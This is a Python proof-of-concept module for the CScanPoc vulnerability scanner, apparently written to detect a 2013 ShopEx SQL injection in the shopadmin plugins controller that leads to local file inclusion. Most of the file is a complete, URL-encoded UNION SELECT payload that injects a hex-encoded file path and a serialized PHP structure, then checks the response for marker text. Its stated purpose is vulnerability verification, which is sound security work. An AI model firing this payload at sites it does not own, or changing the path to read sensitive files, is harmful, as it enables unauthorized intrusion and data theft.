# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ShopEx_0104'  # 平台漏洞编号
    name = 'ShopEx注入并导致任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2013-09-24'  # 漏洞公布时间
    desc = '''
        Shopex是国内市场占有率最高的网店软件。网上商店平台软件系统又称网店管理系统、网店程序、网上购物系统、在线购物系统。
        ShopEx注入并导致任意文件包含漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=26912'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopEx'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '35b55214-9db8-4d63-b895-5ebc8929942d'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/shopadmin/index.php?ctl=plugins/pp.php%27%20and%201=2%20union%20select%20plugin_id,0x2E2F2E2E2F726561646D652E747874%20as%20plugin_path,%27s:5:%22funcs%22;a:9:{s:13:%22action_member%22;s:13:%22action_member%22;s:7:%22actions%22;s:7:%22actions%22;s:8:%22changelv%22;s:8:%22changelv%22;s:8:%22addpoint%22;s:8:%22addpoint%22;s:8:%22delpoint%22;s:8:%22delpoint%22;s:10:%22addadvance%22;s:10:%22addadvance%22;s:10:%22deladvance%22;s:10:%22deladvance%22;s:10:%22sendcoupon%22;s:10:%22sendcoupon%22;s:6:%22settag%22;s:6:%22settag%22;}}%27%20as%20plugin_struct,plugin_config,0%20as%20plugin_base%20FROM%20sdb_plugins%20limit%201%23"
            url = self.target + payload
            response = requests.get(url)
            if "发布时间" in response.text or "可对原文件" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
